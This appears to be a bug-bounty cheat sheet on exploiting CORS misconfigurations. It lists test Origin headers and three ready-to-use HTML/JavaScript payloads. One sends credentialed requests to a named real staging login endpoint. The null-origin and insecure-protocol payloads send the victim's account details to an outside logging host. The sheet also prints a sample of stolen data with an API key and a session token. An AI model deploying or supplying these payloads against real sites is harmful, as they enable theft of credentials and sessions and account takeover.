<h1>CORS Misconfiguration</h1>
<h3>Impact:</h3>
<p>Api token, email, password, and other types of sensitive data exposure, could lead in account takeover.</p>
<h4>Headers to test:</h4>
<p><code>Origin: https://example.com</code></p>

<p><code>Origin: http://example.com</code></p>

<p><code>Origin: http://subdomain.$domain.com</code></p>

<p>Response:</p>
<p><code>Access-Control-Allow-Origin: https://example.com</code></p>
<p><code>Access-Control-Allow-Origin: https://subdomain.$domain.com</code></p>

<p>CORS vulnerability with trusted null origin</p>
<p>-Go to console, and you must see:</p>
<p><code>https://angeljuanma.github.io/log?key={ "username": "wiener", "email": "", "apikey": "ILmCsS4WvD12NbFLxkHaUt7PnL3cFDzU", "sessions": [ "mWXTjX7lmBUZlRJ9TPWqfN7FxBggUFKg" ] }</code></p>

<p>This will store the accout details.</p>

### CORS Payload Basic Origin
```html
<script>
   var req = new XMLHttpRequest();
   req.onload = reqListener;
   req.open('get','login-staging.arkane.network/auth/realms/Arkane/protocol/openid-connect/auth?client_id=ArkaneMarket&redirect_uri=https%3A%2F%2Fconnect-staging.venly.io%2FcheckAuthenticated%3FclientId%3DArkaneMarket%26origin%3Dhttps%253A%252F%252Fstaging.venly.market%252Faccount%26env%3Dstaging&state=feb678cb-c9b8-4f19-aa3e-f94582e5aaa2&response_mode=fragment&response_type=code&scope=openid&nonce=b5de6a60-5e75-4809-87be-513c84abb663&prompt=none',true);
   req.withCredentials = true;
   req.send();

   function reqListener() {
       alert(1)
       alert(this.responseText);
   };
</script> 
```

### CORS Payload Null Origin
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html, <script>
   var req = new XMLHttpRequest ();
   req.onload = reqListener;
   req.open('get','https://$domain/accountDetails',true);
   req.withCredentials = true;
   req.send();
   function reqListener() {
       location='https://angeljuanma.github.io/All-About-Bug-Bounty/log?key='+encodeURIComponent(this.responseText);
   };
</script>"></iframe>
```
### CORS Payload Insecure Protocols
```html
<script>
   document.location="http://subdomainVuln.$domain.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://$domain/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://angeljuanma.github.io/All-About-Bug-Bounty/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script> 
```
